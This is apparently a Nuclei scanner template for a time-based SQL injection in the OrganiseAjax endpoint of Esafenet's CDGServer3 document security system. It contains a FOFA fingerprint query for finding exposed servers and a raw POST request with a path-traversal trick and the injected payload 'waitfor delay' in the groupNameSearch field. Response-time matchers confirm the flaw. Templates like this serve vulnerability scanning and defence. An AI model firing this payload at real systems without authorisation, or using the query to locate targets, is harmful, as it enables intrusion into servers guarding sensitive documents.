id: esafenet-cdgserver3-OrganiseAjax-sqli

info:
  name: 亿赛通电子文档安全管理系统 OrganiseAjax - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /CDGServer3/js/../OrganiseAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
        Accept-Language: zh-CN
        Content-Type: application/x-www-form-urlencoded
        Connection: close
        
        command=search&groupNameSearch=-1'waitfor delay '0:0:6'--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains_all(body,'waitfor delay')
        condition: and